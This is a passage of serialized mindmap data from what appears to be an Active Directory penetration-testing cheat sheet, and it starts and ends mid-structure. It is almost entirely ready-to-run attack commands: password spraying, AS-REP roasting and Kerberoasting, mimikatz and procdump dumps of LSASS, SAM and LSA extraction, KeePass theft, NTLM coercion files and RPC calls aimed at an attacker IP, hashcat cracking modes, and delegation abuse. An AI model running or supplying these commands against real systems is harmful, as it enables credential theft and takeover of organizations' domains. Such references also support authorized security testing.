Credentials","children":[{"content":"<code>nxc smb &lt;dc_ip&gt; -u &lt;users.txt&gt; -p &lt;password&gt; --continue-on-success</code>","children":[],"payload":{"tag":"li","lines":"1971,1972"}},{"content":"<code>sprayhound -U &lt;users.txt&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc  &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1972,1973"}},{"content":"<code>kerbrute passwordspray -d &lt;domain&gt; &lt;users.txt&gt; &lt;password&gt;</code>","children":[],"payload":{"tag":"li","lines":"1973,1975"}}],"payload":{"tag":"li","lines":"1970,1975"}}],"payload":{"tag":"h3","lines":"1956,1957"}},{"content":"ASREPRoast","children":[{"content":"List ASREPRoastable Users (need creds)","children":[{"content":"<code>MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u</code>","children":[],"payload":{"tag":"li","lines":"1977,1978"}}],"payload":{"tag":"li","lines":"1976,1978"}},{"content":"ASREP roasting &gt;&gt;&gt; Hash found ASREP","children":[{"content":"<code>GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;users.txt&gt; -format hashcat -outputfile &lt;output.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"1979,1980"}},{"content":"<code>nxc ldap &lt;dc_ip&gt; -u &lt;users.txt&gt;  -p &apos;&apos; --asreproast &lt;output.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"1980,1981"}},{"content":"<code>Rubeus.exe asreproast /format:hashcat</code>","children":[],"payload":{"tag":"li","lines":"1981,1982"}}],"payload":{"tag":"li","lines":"1978,1982"}},{"content":"Blind Kerberoasting &gt;&gt;&gt; Hash found TGS","children":[{"content":"<code>Rubeus.exe keberoast /domain:&lt;domain&gt; /dc:&lt;dcip&gt; /nopreauth: &lt;asrep_user&gt; /spns:&lt;users.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"1983,1984"}},{"content":"<code>GetUserSPNs.py -no-preauth &quot;&lt;asrep_user&gt;&quot; -usersfile &quot;&lt;user_list.txt&gt;&quot; -dc-host &quot;&lt;dc_ip&gt;&quot; &quot;&lt;domain&gt;&quot;/</code>","children":[],"payload":{"tag":"li","lines":"1984,1985"}}],"payload":{"tag":"li","lines":"1982,1985"}},{"content":"CVE-2022-33679 @CVE@ &gt;&gt;&gt; Lat move PTT","children":[{"content":"<code>CVE-2022-33679.py &lt;domain&gt;/&lt;user&gt; &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"1986,1988"}}],"payload":{"tag":"li","lines":"1985,1988"}}],"payload":{"tag":"h3","lines":"1975,1976"}}],"payload":{"tag":"h2","lines":"1954,1955"}},{"content":"Admin access","children":[{"content":"Extract credentials from LSASS.exe","children":[{"content":"LSASS as protected process","children":[{"content":"<code>PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp #before 2022-07-22 update</code>","children":[],"payload":{"tag":"li","lines":"1992,1993"}},{"content":"<code>mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  /process:lsass.exe&quot; &quot;!-&quot;</code>","children":[],"payload":{"tag":"li","lines":"1993,1994"}}],"payload":{"tag":"li","lines":"1991,1994"}},{"content":"Extract LSASS secrets  &gt;&gt;&gt; User + Pass || NTLM || PassTheHash || Clear text move","children":[{"content":"<code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code>","children":[],"payload":{"tag":"li","lines":"1995,1996"}},{"content":"<code>mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot;</code>","children":[],"payload":{"tag":"li","lines":"1996,1997"}},{"content":"<code>msf&gt; load kiwi creds_all</code>","children":[],"payload":{"tag":"li","lines":"1997,1998"}},{"content":"<code>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</code>","children":[],"payload":{"tag":"li","lines":"1998,1999"}},{"content":"<code>lsassy -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1999,2001"}}],"payload":{"tag":"li","lines":"1994,2001"}}],"payload":{"tag":"h3","lines":"1990,1991"}},{"content":"Extract credentials from SAM &gt;&gt;&gt; NTLM || PassTheHash","children":[{"content":"<code>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --sam</code>","children":[],"payload":{"tag":"li","lines":"2002,2003"}},{"content":"<code>msf&gt; hashdump</code>","children":[],"payload":{"tag":"li","lines":"2003,2004"}},{"content":"<code>mimikatz &quot;privilege::debug&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</code>","children":[],"payload":{"tag":"li","lines":"2004,2005"}},{"content":"<code>secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2005,2006"}},{"content":"<code>reg save HKLM\\SAM &lt;file&gt;;  reg save HKLM\\SYSTEM &lt;file&gt;</code>","children":[{"content":"<code>secretsdump.py -system SYSTEM -sam SAM LOCAL</code>","children":[],"payload":{"tag":"li","lines":"2007,2008"}}],"payload":{"tag":"li","lines":"2006,2008"}},{"content":"<code>reg.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; backup -o &apos;\\\\&lt;smb_ip&gt;\\share&apos;</code>","children":[{"content":"<code>secretsdump.py -system SYSTEM -sam SAM LOCAL</code>","children":[],"payload":{"tag":"li","lines":"2009,2010"}}],"payload":{"tag":"li","lines":"2008,2010"}},{"content":"<code>regsecrets.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2010,2012"}}],"payload":{"tag":"h3","lines":"2001,2002"}},{"content":"Extract credentials from LSA &gt;&gt;&gt; MsCache 2 || User + Pass","children":[{"content":"<code>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --lsa</code>","children":[],"payload":{"tag":"li","lines":"2013,2014"}},{"content":"<code>mimikatz &quot;privilege::debug&quot; &quot;lsadump::lsa&quot; &quot;exit&quot;</code>","children":[],"payload":{"tag":"li","lines":"2014,2015"}},{"content":"<code>reg save HKLM\\SECURITY &lt;file&gt;;  reg save HKLM\\SYSTEM &lt;file&gt;</code>","children":[{"content":"<code>secretsdump.py -system SYSTEM -security SECURITY</code>","children":[],"payload":{"tag":"li","lines":"2016,2017"}}],"payload":{"tag":"li","lines":"2015,2017"}},{"content":"<code>reg.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; backup -o &apos;\\\\&lt;smb_ip&gt;\\share&apos;</code>","children":[],"payload":{"tag":"li","lines":"2017,2019"}}],"payload":{"tag":"h3","lines":"2012,2013"}}],"payload":{"tag":"h2","lines":"1988,1989"}},{"content":"Extract credentials from DPAPI","children":[{"content":"Impersonate","children":[{"content":"\n<p data-lines=\"2037,2038\">Impersonate &gt;&gt;&gt; ACL || User + Pass</p>","children":[{"content":"<code>msf&gt; use incognito impersonate_token &lt;domain&gt;\\\\&lt;user&gt;</code>","children":[],"payload":{"tag":"li","lines":"2038,2039"}},{"content":"<code>nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; --loggedon-users</code>","children":[{"content":"<code>nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; -M schtask_as -o USER=&lt;logged-on-user&gt; CMD=&lt;cmd-command&gt;</code>","children":[],"payload":{"tag":"li","lines":"2040,2041"}}],"payload":{"tag":"li","lines":"2039,2041"}},{"content":"<code>irs.exe list</code>","children":[{"content":"<code>irs.exe exec -p &lt;pid&gt; -c &lt;command&gt;</code>","children":[],"payload":{"tag":"li","lines":"2042,2044"}}],"payload":{"tag":"li","lines":"2041,2044"}}],"payload":{"tag":"li","lines":"2037,2044"}},{"content":"\n<p data-lines=\"2044,2045\">Impersonate with adcs &gt;&gt;&gt; NTLM || Pass The Hash / Ticket / Certificate</p>","children":[{"content":"<code>masky - d &lt;domain&gt; -u &lt;user&gt;  (-p &lt;password&gt; || -k || -H &lt;hash&gt;) -ca &lt;certificate authority&gt; &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2045,2047"}}],"payload":{"tag":"li","lines":"2044,2047"}},{"content":"\n<p data-lines=\"2047,2048\">Impersonate RDP Session &gt;&gt;&gt; RDP</p>","children":[{"content":"<code>psexec.exe -s -i cmd</code>","children":[{"content":"<code>query user</code>","children":[{"content":"<code>tscon.exe &lt;id&gt; /dest:&lt;session_name&gt;</code>","children":[],"payload":{"tag":"li","lines":"2050,2052"}}],"payload":{"tag":"li","lines":"2049,2052"}}],"payload":{"tag":"li","lines":"2048,2052"}}],"payload":{"tag":"li","lines":"2047,2052"}}],"payload":{"tag":"h3","lines":"2036,2037"}},{"content":"Misc","children":[{"content":"Find Users &gt;&gt;&gt; Username","children":[{"content":"<code>smbmap.py --host-file ./computers.list -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -r &apos;C&#x24;\\Users&apos; --dir-only --no-write-check --no-update --no-color --csv users_directory.csv</code>","children":[],"payload":{"tag":"li","lines":"2054,2055"}}],"payload":{"tag":"li","lines":"2053,2055"}},{"content":"Extract Keepass &gt;&gt;&gt; User + Pass","children":[{"content":"<code>KeePwn.py plugin add -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -d &apos;&lt;domain&gt;&apos; -t &lt;target&gt; --plugin KeeFarceRebornPlugin.dll</code>","children":[],"payload":{"tag":"li","lines":"2056,2057"}},{"content":"<code>KeePwn.py trigger add -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -d &apos;&lt;domain&gt;&apos; -t &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"2057,2058"}}],"payload":{"tag":"li","lines":"2055,2058"}},{"content":"Hybrid (Azure AD-Connect) &gt;&gt;&gt; DCSYNC","children":[{"content":"Dump cleartext password of MSOL Account on ADConnect Server","children":[{"content":"<code>azuread_decrypt_msol_v2.ps1</code>","children":[],"payload":{"tag":"li","lines":"2060,2061"}},{"content":"<code>nxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M msol</code>","children":[],"payload":{"tag":"li","lines":"2061,2063"}}],"payload":{"tag":"li","lines":"2059,2063"}}],"payload":{"tag":"li","lines":"2058,2063"}}],"payload":{"tag":"h3","lines":"2052,2053"}}],"payload":{"tag":"h2","lines":"2019,2020"}},{"content":"Valid Credentials (cleartext creds, nt hash, kerberos ticket)","children":[{"content":"Classic Enumeration (users, shares, ACL, delegation, ...)","children":[{"content":"Find all users &gt;&gt;&gt; Username","children":[{"content":"<code>GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;</code>","children":[],"payload":{"tag":"li","lines":"2068,2069"}},{"content":"<code>nxc smb &lt;dc_ip&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; --users</code>","children":[],"payload":{"tag":"li","lines":"2069,2070"}}],"payload":{"tag":"li","lines":"2067,2070"}},{"content":"Enumerate SMB share &gt;&gt;&gt; Scroll shares","children":[{"content":"<code>nxc smb &lt;ip_range&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -M spider_plus</code>","children":[],"payload":{"tag":"li","lines":"2071,2072"}},{"content":"<code>nxc smb &lt;ip_range&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; --shares [--get-file \\\\&lt;filename&gt; &lt;filename&gt;] </code>","children":[],"payload":{"tag":"li","lines":"2072,2073"}},{"content":"<code>manspider &lt;ip_range&gt; -c passw -e &lt;file extensions&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt;</code>","children":[],"payload":{"tag":"li","lines":"2073,2074"}}],"payload":{"tag":"li","lines":"2070,2074"}},{"content":"Bloodhound Legacy &gt;&gt;&gt; ACL || Delegation || Username","children":[{"content":"<code>bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</code>","children":[],"payload":{"tag":"li","lines":"2075,2076"}},{"content":"<code>rusthound -d &lt;domain_to_enum&gt; -u &apos;&lt;user&gt;@&lt;domain&gt;&apos; -p &apos;&lt;password&gt;&apos; -o &lt;outfile.zip&gt; -z</code>","children":[],"payload":{"tag":"li","lines":"2076,2077"}},{"content":"<code>import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain &lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"2077,2078"}},{"content":"<code>sharphound.exe -c all -d &lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"2078,2079"}}],"payload":{"tag":"li","lines":"2074,2079"}},{"content":"Bloodhound CE &gt;&gt;&gt; ACL || Delegation || Username","children":[{"content":"<code>bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</code>","children":[],"payload":{"tag":"li","lines":"2080,2081"}},{"content":"<code>rusthound-ce -d &lt;domain_to_enum&gt; -u &apos;&lt;user&gt;@&lt;domain&gt;&apos; -p &apos;&lt;password&gt;&apos; -o &lt;outfile.zip&gt; -z --ldap-filter=(objectGuid=*)</code>","children":[],"payload":{"tag":"li","lines":"2081,2082"}},{"content":"<code>sharphound.exe -c all -d &lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"2082,2083"}},{"content":"<code>SOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output --autosplit --threshold 900</code>","children":[],"payload":{"tag":"li","lines":"2083,2084"}}],"payload":{"tag":"li","lines":"2079,2084"}},{"content":"Enumerate Ldap &gt;&gt;&gt; ACL || Delegation || Username","children":[{"content":"<code>ldeep ldap -u &lt;users&gt; -p &apos;&lt;password&gt;&apos; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; all &lt;backup_folder&gt;</code>","children":[],"payload":{"tag":"li","lines":"2085,2086"}},{"content":"<code>ldapdomaindump.py -u &lt;user&gt; -p &lt;password&gt; -o &lt;dump_folder&gt; ldap://&lt;dc_ip&gt;:389</code>","children":[],"payload":{"tag":"li","lines":"2086,2087"}},{"content":"<code>ldapsearch-ad.py -l &lt;dc_ip&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &apos;&lt;password&gt;&apos; -o &lt;output.log&gt; -t all</code>","children":[],"payload":{"tag":"li","lines":"2087,2088"}}],"payload":{"tag":"li","lines":"2084,2088"}},{"content":"Enumerate DNS &gt;&gt;&gt; New targets (low hanging fruit)","children":[{"content":"<code>adidnsdump -u &lt;domain&gt;\\\\&lt;user&gt; -p &quot;&lt;password&gt;&quot; --print-zones &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2089,2091"}}],"payload":{"tag":"li","lines":"2088,2091"}}],"payload":{"tag":"h3","lines":"2065,2066"}},{"content":"Enumerate ADCS &gt;&gt;&gt; ADCS Exploitation","children":[{"content":"<code>certify.exe find</code>","children":[],"payload":{"tag":"li","lines":"2092,2093"}},{"content":"<code>certipy find -u &lt;user&gt;@&lt;domain&gt; -p &apos;&lt;password&gt;&apos; -dc-ip &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2093,2095"}}],"payload":{"tag":"h3","lines":"2091,2092"}},{"content":"Enumerate SCCM &gt;&gt;&gt; SCCM Exploitation","children":[{"content":"<code>sccmhunter.py find -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc-ip &lt;dc_ip&gt; -debug</code>","children":[],"payload":{"tag":"li","lines":"2096,2097"}},{"content":"<code>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; sccm</code>","children":[],"payload":{"tag":"li","lines":"2097,2098"}},{"content":"<code>SharpSCCM.exe local site-info</code>","children":[],"payload":{"tag":"li","lines":"2098,2100"}}],"payload":{"tag":"h3","lines":"2095,2096"}},{"content":"Scan Auto","children":[{"content":"from BH result","children":[{"content":"<code>AD-miner -c -cf Report -u &lt;neo4j_username&gt; -p &lt;neo4j_password&gt;</code>","children":[],"payload":{"tag":"li","lines":"2102,2103"}}],"payload":{"tag":"li","lines":"2101,2103"}},{"content":"<code>PingCastle.exe --healthcheck --server &lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"2103,2104"}},{"content":"<code>Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain &apos;&lt;domain&gt;&apos; -Server &apos;&lt;dc_fqdn&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"2104,2106"}}],"payload":{"tag":"h3","lines":"2100,2101"}},{"content":"Kerberoasting &gt;&gt;&gt; Hash TGS","children":[{"content":"<code>MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH &apos;-502&apos; AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u</code>","children":[],"payload":{"tag":"li","lines":"2107,2108"}},{"content":"<code>GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</code>","children":[],"payload":{"tag":"li","lines":"2108,2109"}},{"content":"<code>Rubeus.exe kerberoast</code>","children":[],"payload":{"tag":"li","lines":"2109,2111"}}],"payload":{"tag":"h3","lines":"2106,2107"}},{"content":"Coerce","children":[{"content":"Drop file","children":[{"content":".lnk","children":[{"content":"<code>nxc smb &lt;dc_ip&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -M slinky -o NAME=&lt;filename&gt; SERVER=&lt;attacker_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2114,2115"}}],"payload":{"tag":"li","lines":"2113,2115"}},{"content":".scf","children":[{"content":"<code>nxc smb &lt;dc_ip&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -M sucffy -o NAME=&lt;filename&gt; SERVER=&lt;attacker_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2116,2117"}}],"payload":{"tag":"li","lines":"2115,2117"}},{"content":".url","children":[{"content":"<code>[InternetShortcut]... IconFile=\\\\&lt;attacker_ip&gt;\\%USERNAME%.icon</code>","children":[],"payload":{"tag":"li","lines":"2118,2119"}}],"payload":{"tag":"li","lines":"2117,2119"}},{"content":"Other files","children":[{"content":"<code>ntlm_theft.py -g all -s &lt;your_ip&gt; -f test</code>","children":[],"payload":{"tag":"li","lines":"2120,2121"}}],"payload":{"tag":"li","lines":"2119,2121"}}],"payload":{"tag":"li","lines":"2112,2121"}},{"content":"Webdav","children":[{"content":"Enable webclient","children":[{"content":".searchConnector-ms","children":[{"content":"<code>nxc smb &lt;dc_ip&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -M drop-sc</code>","children":[],"payload":{"tag":"li","lines":"2124,2125"}}],"payload":{"tag":"li","lines":"2123,2125"}}],"payload":{"tag":"li","lines":"2122,2125"}},{"content":"add attack computer in dns","children":[{"content":"<code>dnstool.py -u &lt;domain&gt;\\&lt;user&gt; -p &lt;pass&gt; --record &lt;attack_name&gt; --action add --data &lt;ip_attacker&gt; &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2126,2127"}}],"payload":{"tag":"li","lines":"2125,2127"}},{"content":"Launch coerce with &lt;attacker_hostname&gt;@80/x as target &gt;&gt;&gt; HTTP Coerce","children":[],"payload":{"tag":"li","lines":"2127,2128"}}],"payload":{"tag":"li","lines":"2121,2128"}},{"content":"RPC call &gt;&gt;&gt; SMB NTLM Coerce","children":[{"content":"<code>printerbug.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;printer_ip&gt; &lt;listener_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2129,2130"}},{"content":"<code>petitpotam.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;listnerer_ip&gt; &lt;target_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2130,2131"}},{"content":"<code>coercer.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -t &lt;target&gt; -l &lt;attacker_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2131,2132"}}],"payload":{"tag":"li","lines":"2128,2132"}},{"content":"Coerce kerberos &gt;&gt;&gt; SMB Kerberos coerce","children":[{"content":"<code>dnstool.py -u &quot;&lt;domain&gt;\\&lt;user&gt;&quot; -p &apos;&lt;password&gt;&apos; -d &quot;&lt;attacker_ip&gt;&quot; --action add &quot;&lt;dns_server_ip&gt;&quot; -r &quot;&lt;servername&gt;1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&quot; --tcp</code>","children":[{"content":"<code>petitpotam.py -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -d &lt;domain&gt; &apos;&lt;servername&gt;1UWh...&apos; &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"2134,2136"}}],"payload":{"tag":"li","lines":"2133,2136"}}],"payload":{"tag":"li","lines":"2132,2136"}}],"payload":{"tag":"h3","lines":"2111,2112"}},{"content":"Intra ID Connect","children":[{"content":"Find MSOL","children":[{"content":"<code>nxc ldap &lt;dc_ip&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; -M get-desc-users |grep -i MSOL</code>","children":[],"payload":{"tag":"li","lines":"2138,2140"}}],"payload":{"tag":"li","lines":"2137,2140"}}],"payload":{"tag":"h3","lines":"2136,2137"}},{"content":"Can Connect to a computer &gt;&gt;&gt; Lateral move","children":[],"payload":{"tag":"h3","lines":"2140,2141"}}],"payload":{"tag":"h2","lines":"2063,2064"}},{"content":"Crack hash","children":[{"content":"NT (b4b9b02e6f09a9bd760...)","children":[{"content":"<code>john --format=nt hash.txt --wordlist=&lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2149,2150"}},{"content":"<code>hashcat -m 1000 -a 0 hash.txt &lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2150,2152"}}],"payload":{"tag":"h3","lines":"2148,2149"}},{"content":"NTLMv1 (user::85D5BC...)","children":[{"content":"<code>john --format=netntlm hash.txt --wordlist=&lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2153,2154"}},{"content":"<code>hashcat -m 1000 -a 0 hash.txt &lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2154,2155"}},{"content":"crack.sh<br>\n<a href=\"https://crack.sh/\">https://crack.sh/</a>","children":[],"payload":{"tag":"li","lines":"2155,2158"}}],"payload":{"tag":"h3","lines":"2152,2153"}},{"content":"NTLMv2 (user::N46iSNek...)","children":[{"content":"<code>john --format=netntlmv2 hash.txt --wordlist=&lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2159,2160"}},{"content":"<code>hashcat -m 5600 -a 0 hash.txt &lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2160,2162"}}],"payload":{"tag":"h3","lines":"2158,2159"}},{"content":"Kerberos 5 TGS (&#x24;krb5tgs&#x24;23&#x24;...)","children":[{"content":"<code>john --format=krb5tgs hash.txt --wordlist=&lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2163,2164"}},{"content":"<code>hashcat -m 13100 -a 0 hash.txt &lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2164,2166"}}],"payload":{"tag":"h3","lines":"2162,2163"}},{"content":"Kerberos 5 TGS AES128 (&#x24;krb5tgs&#x24;17...)","children":[{"content":"<code>hashcat -m 19600 -a 0 hash.txt &lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2167,2169"}}],"payload":{"tag":"h3","lines":"2166,2167"}},{"content":"Kerberos ASREP (&#x24;krb5asrep&#x24;23...)","children":[{"content":"<code>hashcat -m 18200 -a 0 hash.txt &lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2170,2172"}}],"payload":{"tag":"h3","lines":"2169,2170"}},{"content":"MSCache 2 (very slow) (&#x24;DCC2&#x24;10240...)","children":[{"content":"<code>hashcat -m 2100 -a 0 hash.txt &lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2173,2175"}}],"payload":{"tag":"h3","lines":"2172,2173"}},{"content":"Timeroast hash (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>n</mi><mi>t</mi><mi>p</mi><mo>&#x2212;</mo><mi>m</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">sntp-ms</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8095em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">tp</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">&#x2212;</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span></span></span></span>...)","children":[{"content":"<code>hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l </code>","children":[],"payload":{"tag":"li","lines":"2176,2178"}}],"payload":{"tag":"h3","lines":"2175,2176"}},{"content":"pxe hash (&#x24;sccm&#x24;aes128&#x24;...)","children":[{"content":"<code>hashcat -m 19850 -a 0 hash.txt &lt;rockyou.txt&gt;</code>","children":[],"payload":{"tag":"li","lines":"2179,2181"}}],"payload":{"tag":"h3","lines":"2178,2179"}}],"payload":{"tag":"h2","lines":"2142,2143"}},{"content":"Kerberos Delegation","children":[{"content":"Find delegation","children":[{"content":"<code>findDelegation.py &quot;&lt;domain&gt;&quot;/&quot;&lt;user&gt;&quot;:&quot;&lt;password&gt;&quot;</code>","children":[],"payload":{"tag":"li","lines":"2184,2185"}},{"content":"With BloodHound","children":[{"content":"Unconstrained","children":[{"content":"<code>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code>","children":[],"payload":{"tag":"li","lines":"2187,2188"}},{"content":"<code>MATCH (c:User {unconstraineddelegation:true}) RETURN c</code>","children":[],"payload":{"tag":"li","lines":"2188,2189"}}],"payload":{"tag":"li","lines":"2186,2189"}},{"content":"Constrained","children":[{"content":"<code>MATCH p=((c:Base)-[:AllowedToDelegate]-&gt;(t:Computer)) RETURN p</code>","children":[],"payload":{"tag":"li","lines":"2190,2191"}},{"content":"<code>MATCH p=shortestPath((u:User)-[*1..]-&gt;(c:Computer {name: &quot;&lt;MYTARGET.FQDN&gt;&quot;})) RETURN p</code>","children":[],"payload":{"tag":"li","lines":"2191,2193"}}],"payload":{"tag":"li","lines":"2189,2193"}}],"payload":{"tag":"li","lines":"2185,2193"}}],"payload":{"tag":"h3","lines":"2183,2184"}},{"content":"Unconstrained delegation &gt;&gt;&gt; Kerberos TGT &gt;&gt;&gt; PassTheTicket","children":[{"content":"UAC: ADS_UF_TRUSTED_FOR_DELEGATION","children":[{"content":"Force connection  with coerce","children":[{"content":"Get tickets","children":[{"content":"<code>mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export</code>","children":[],"payload":{"tag":"li","lines":"2197,2198"}},{"content":"<code>Rubeus.exe dump /service:krbtgt /nowrap</code>","children":[],"payload":{"tag":"li","lines":"2198,2199"}},{"content":"<code>Rubeus.exe dump /luid:0xdeadbeef /nowrap</code>","children":[],"payload":{"tag":"li","lines":"2199,2200"}},{"content":"<code>Rubeus.exe monitor /interval:5</code>","children":[],"payload":{"tag":"li","lines":"2200,2202"}}],"payload":{"tag":"li","lines":"2196,2202"}}],"payload":{"tag":"li","lines":"2195,2202"}}],"payload":{"tag":"li","lines":"2194,2202"}}],"payload":{"tag":"h3","lines":"2193,2194"}},{"content":"Constrained delegation","children":[{"content":"\n<p data-lines=\"2203,2204\">With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION</p>","children":[{"content":"Get TGT for user","children":[{"content":"Request S4u2self","children":[{"content":"Request S4u2proxy","children":[],"payload":{"tag":"li","lines":"2206,2207"}}],"payload":{"tag":"li","lines":"2205,2207"}}],"payload":{"tag":"li","lines":"2204,2207"}},{"content":"<code>Rubeus.exe hash /password:&lt;password&gt;</code>","children":[{"content":"<code>Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;AES 256 hash&gt;</code>","children":[{"content":"<code>Rubeus.exe s4u /ticket:&lt;ticket&gt; /impersonateuser:&lt;admin_user&gt; /msdsspn:&lt;spn_constrained&gt; /altservice:&lt;altservice&gt; /ptt</code>","children":[{"content":"Altservice HTTP/HOST/CIFS/LDAP  &gt;&gt;&gt; Kerberos TGS","children":[],"payload":{"tag":"li","lines":"2210,2211"}}],"payload":{"tag":"li","lines":"2209,2211"}}],"payload":{"tag":"li","lines":"2208,2211"}}],"payload":{"tag":"li","lines":"2207,2211"}},{"content":"<code>getST.py -spn &apos;&lt;spn&gt;/&lt;target&gt;&apos; -impersonate Administrator -dc-ip &apos;&lt;dc_ip&gt;&apos; &apos;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&apos; -altservice &lt;altservice&gt;</code>","children":[{"content":"Altservice HTTP/HOST/CIFS/LDAP &gt;&gt;&gt; Kerberos 